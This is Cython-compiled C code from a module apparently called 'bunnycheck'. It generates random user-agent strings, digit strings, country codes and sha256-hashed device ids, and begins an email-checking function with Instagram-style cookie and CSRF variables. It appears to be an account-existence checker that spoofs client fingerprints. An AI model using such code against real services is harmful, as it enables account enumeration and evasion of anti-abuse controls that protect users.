  PyTuple_SET_ITEM(__pyx_t_1, 13, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u__36);
  __pyx_t_5 += 2;
  __Pyx_GIVEREF(__pyx_kp_u__36);
  PyTuple_SET_ITEM(__pyx_t_1, 14, __pyx_kp_u__36);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 389, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_choice); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 389, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_2 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_4, __pyx_v_dp) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_v_dp);
  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 389, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 389, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_6 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_6) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_6;
  __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 15, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u__36);
  __pyx_t_5 += 2;
  __Pyx_GIVEREF(__pyx_kp_u__36);
  PyTuple_SET_ITEM(__pyx_t_1, 16, __pyx_kp_u__36);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 389, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_choice); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 389, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_3 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_2, __pyx_v_lan) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_v_lan);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 389, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 389, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_6 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_6) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_6;
  __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_1, 17, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u__36);
  __pyx_t_5 += 2;
  __Pyx_GIVEREF(__pyx_kp_u__36);
  PyTuple_SET_ITEM(__pyx_t_1, 18, __pyx_kp_u__36);
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 389, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 389, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_4 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_3, __pyx_v_cc) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_v_cc);
  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 389, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 389, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_6 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_6) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_6;
  __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_1, 19, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u__37);
  __pyx_t_5 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__37);
  PyTuple_SET_ITEM(__pyx_t_1, 20, __pyx_kp_u__37);
  __pyx_t_2 = __Pyx_PyUnicode_Join(__pyx_t_1, 21, __pyx_t_5, __pyx_t_6); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 389, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_user_agent = ((PyObject*)__pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_XDECREF(__pyx_r);
  __Pyx_INCREF(__pyx_v_user_agent);
  __pyx_r = __pyx_v_user_agent;
  goto __pyx_L0;

  

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_AddTraceback("source.bunnycheck.bunny_user_agent", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_ii);
  __Pyx_XDECREF(__pyx_v_aa);
  __Pyx_XDECREF(__pyx_v_ss);
  __Pyx_XDECREF(__pyx_v_dd);
  __Pyx_XDECREF(__pyx_v_cc);
  __Pyx_XDECREF(__pyx_v_lan);
  __Pyx_XDECREF(__pyx_v_dp);
  __Pyx_XDECREF(__pyx_v_arm);
  __Pyx_XDECREF(__pyx_v_comb);
  __Pyx_XDECREF(__pyx_v_sos);
  __Pyx_XDECREF(__pyx_v_vlo);
  __Pyx_XDECREF(__pyx_v_lop);
  __Pyx_XDECREF(__pyx_v_ki);
  __Pyx_XDECREF(__pyx_v_mo);
  __Pyx_XDECREF(__pyx_v_user_agent);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}
static PyObject *__pyx_gb_6source_10bunnycheck_4generator3(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value); /* proto */



static PyObject *__pyx_pf_6source_10bunnycheck_2genexpr(CYTHON_UNUSED PyObject *__pyx_self) {
  struct __pyx_obj_6source___pyx_scope_struct_3_genexpr *__pyx_cur_scope;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("genexpr", 0);
  __pyx_cur_scope = (struct __pyx_obj_6source___pyx_scope_struct_3_genexpr *)__pyx_tp_new_6source___pyx_scope_struct_3_genexpr(__pyx_ptype_6source___pyx_scope_struct_3_genexpr, __pyx_empty_tuple, NULL);
  if (unlikely(!__pyx_cur_scope)) {
    __pyx_cur_scope = ((struct __pyx_obj_6source___pyx_scope_struct_3_genexpr *)Py_None);
    __Pyx_INCREF(Py_None);
    __PYX_ERR(0, 479, __pyx_L1_error)
  } else {
    __Pyx_GOTREF(__pyx_cur_scope);
  }
  {
    __pyx_CoroutineObject *gen = __Pyx_Generator_New((__pyx_coroutine_body_t) __pyx_gb_6source_10bunnycheck_4generator3, NULL, (PyObject *) __pyx_cur_scope, __pyx_n_s_genexpr, __pyx_n_s_bunnycheck_locals_genexpr, __pyx_n_s_source); if (unlikely(!gen)) __PYX_ERR(0, 479, __pyx_L1_error)
    __Pyx_DECREF(__pyx_cur_scope);
    __Pyx_RefNannyFinishContext();
    return (PyObject *) gen;
  }

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_AddTraceback("source.bunnycheck.genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __Pyx_DECREF(((PyObject *)__pyx_cur_scope));
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_gb_6source_10bunnycheck_4generator3(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value) /* generator body */
{
  struct __pyx_obj_6source___pyx_scope_struct_3_genexpr *__pyx_cur_scope = ((struct __pyx_obj_6source___pyx_scope_struct_3_genexpr *)__pyx_generator->closure);
  PyObject *__pyx_r = NULL;
  long __pyx_t_1;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("genexpr", 0);
  switch (__pyx_generator->resume_label) {
    case 0: goto __pyx_L3_first_run;
    default: /* CPython raises the right error here */
    __Pyx_RefNannyFinishContext();
    return NULL;
  }
  __pyx_L3_first_run:;
  if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 479, __pyx_L1_error)
  __pyx_r = PyList_New(0); if (unlikely(!__pyx_r)) __PYX_ERR(0, 479, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_r);
  for (__pyx_t_1 = 0; __pyx_t_1 < 15; __pyx_t_1+=1) {
    __pyx_cur_scope->__pyx_v__ = __pyx_t_1;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 479, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 479, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_4);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_4, function);
      }
    }
    __pyx_t_2 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_3, __pyx_kp_u_1234567890) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_kp_u_1234567890);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 479, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(__Pyx_ListComp_Append(__pyx_r, (PyObject*)__pyx_t_2))) __PYX_ERR(0, 479, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  CYTHON_MAYBE_UNUSED_VAR(__pyx_cur_scope);

  /* function exit code */
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_r); __pyx_r = 0;
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_AddTraceback("genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  #if !CYTHON_USE_EXC_INFO_STACK
  __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
  #endif
  __pyx_generator->resume_label = -1;
  __Pyx_Coroutine_clear((PyObject*)__pyx_generator);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



static PyObject *__pyx_pf_6source_10bunnycheck(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_email) {
  PyObject *__pyx_v_Variable = NULL;
  PyObject *__pyx_v_variable_instance = NULL;
  PyObject *__pyx_v_bunny_user_agent = 0;
  PyObject *__pyx_v_method = NULL;
  PyObject *__pyx_v_csrftoken = NULL;
  PyObject *__pyx_v_headers = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_response = NULL;
  PyObject *__pyx_v_ua = NULL;
  PyObject *__pyx_v_device_id = NULL;
  PyObject *__pyx_v_uui = NULL;
  PyObject *__pyx_v_cookies = NULL;
  PyObject *__pyx_v_responses = NULL;
  PyObject *__pyx_v_mid = NULL;
  PyObject *__pyx_v_url = NULL;
  PyObject *__pyx_v_e = NULL;
  PyObject *__pyx_v_csrf = NULL;
  PyObject *__pyx_v_ig_did = NULL;
  PyObject *__pyx_v_ig_nrcb = NULL;
  PyObject *__pyx_v_app = NULL;
  PyObject *__pyx_v_response2 = NULL;
  PyObject *__pyx_v_payload = NULL;
  PyObject *__pyx_v_response_data = NULL;
  PyObject *__pyx_v_res = NULL;
  PyObject *__pyx_8genexpr3__pyx_v_6source_10bunnycheck_8Variable_country = NULL;
  PyObject *__pyx_gb_6source_10bunnycheck_4generator3 = 0;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  Py_ssize_t __pyx_t_5;
  PyObject *(*__pyx_t_6)(PyObject *);
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  PyObject *__pyx_t_13 = NULL;
  int __pyx_t_14;
  int __pyx_t_15;
  PyObject *__pyx_t_16 = NULL;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  int __pyx_t_19;
  PyObject *__pyx_t_20 = NULL;
  Py_UCS4 __pyx_t_21;
  int __pyx_t_22;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("bunnycheck", 0);

  
  __pyx_t_1 = __Pyx_Py3MetaclassPrepare((PyObject *) NULL, __pyx_empty_tuple, __pyx_n_s_Variable, __pyx_n_s_bunnycheck_locals_Variable, (PyObject *) NULL, __pyx_n_s_source, (PyObject *) NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);

  
  { /* enter inner scope */
    __pyx_t_2 = PyList_New(0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 353, __pyx_L5_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_pycountry); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 353, __pyx_L5_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_countries); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 353, __pyx_L5_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (likely(PyList_CheckExact(__pyx_t_4)) || PyTuple_CheckExact(__pyx_t_4)) {
      __pyx_t_3 = __pyx_t_4; __Pyx_INCREF(__pyx_t_3); __pyx_t_5 = 0;
      __pyx_t_6 = NULL;
    } else {
      __pyx_t_5 = -1; __pyx_t_3 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 353, __pyx_L5_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_6 = Py_TYPE(__pyx_t_3)->tp_iternext; if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 353, __pyx_L5_error)
    }
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    for (;;) {
      if (likely(!__pyx_t_6)) {
        if (likely(PyList_CheckExact(__pyx_t_3))) {
          if (__pyx_t_5 >= PyList_GET_SIZE(__pyx_t_3)) break;
          #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
          __pyx_t_4 = PyList_GET_ITEM(__pyx_t_3, __pyx_t_5); __Pyx_INCREF(__pyx_t_4); __pyx_t_5++; if (unlikely(0 < 0)) __PYX_ERR(0, 353, __pyx_L5_error)
          #else
          __pyx_t_4 = PySequence_ITEM(__pyx_t_3, __pyx_t_5); __pyx_t_5++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 353, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_4);
          #endif
        } else {
          if (__pyx_t_5 >= PyTuple_GET_SIZE(__pyx_t_3)) break;
          #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
          __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_3, __pyx_t_5); __Pyx_INCREF(__pyx_t_4); __pyx_t_5++; if (unlikely(0 < 0)) __PYX_ERR(0, 353, __pyx_L5_error)
          #else
          __pyx_t_4 = PySequence_ITEM(__pyx_t_3, __pyx_t_5); __pyx_t_5++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 353, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_4);
          #endif
        }
      } else {
        __pyx_t_4 = __pyx_t_6(__pyx_t_3);
        if (unlikely(!__pyx_t_4)) {
          PyObject* exc_type = PyErr_Occurred();
          if (exc_type) {
            if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
            else __PYX_ERR(0, 353, __pyx_L5_error)
          }
          break;
        }
        __Pyx_GOTREF(__pyx_t_4);
      }
      __Pyx_XDECREF_SET(__pyx_8genexpr3__pyx_v_6source_10bunnycheck_8Variable_country, __pyx_t_4);
      __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_8genexpr3__pyx_v_6source_10bunnycheck_8Variable_country, __pyx_n_s_numeric); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 353, __pyx_L5_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (unlikely(__Pyx_ListComp_Append(__pyx_t_2, (PyObject*)__pyx_t_4))) __PYX_ERR(0, 353, __pyx_L5_error)
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    }
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_8genexpr3__pyx_v_6source_10bunnycheck_8Variable_country); __pyx_8genexpr3__pyx_v_6source_10bunnycheck_8Variable_country = 0;
    goto __pyx_L8_exit_scope;
    __pyx_L5_error:;
    __Pyx_XDECREF(__pyx_8genexpr3__pyx_v_6source_10bunnycheck_8Variable_country); __pyx_8genexpr3__pyx_v_6source_10bunnycheck_8Variable_country = 0;
    goto __pyx_L1_error;
    __pyx_L8_exit_scope:;
  } /* exit inner scope */
  if (__Pyx_SetNameInClass(__pyx_t_1, __pyx_n_s_country, __pyx_t_2) < 0) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyObject_GetItem(__pyx_t_1, __pyx_n_s_country);
  if (unlikely(!__pyx_t_3)) {
    PyErr_Clear();
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_country);
  }
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_7 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_7)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_7);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_2 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_7, __pyx_t_3) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_3);
  __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (__Pyx_SetNameInClass(__pyx_t_1, __pyx_n_s_num, __pyx_t_2) < 0) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_hashlib); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 355, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_sha256); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 355, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_uuid); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 355, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 355, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_10);
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
  __pyx_t_9 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_10))) {
    __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_10);
    if (likely(__pyx_t_9)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
      __Pyx_INCREF(__pyx_t_9);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_10, function);
    }
  }
  __pyx_t_8 = (__pyx_t_9) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_9) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
  if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 355, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
  __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_hex); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 355, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_10);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_encode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 355, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
  __pyx_t_10 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
    __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_8);
    if (likely(__pyx_t_10)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
      __Pyx_INCREF(__pyx_t_10);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_8, function);
    }
  }
  __pyx_t_3 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 355, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_7))) {
    __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_7);
    if (likely(__pyx_t_8)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
      __Pyx_INCREF(__pyx_t_8);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_7, function);
    }
  }
  __pyx_t_4 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_8, __pyx_t_3) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_3);
  __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 355, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_hexdigest); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 355, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_7);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_7, function);
    }
  }
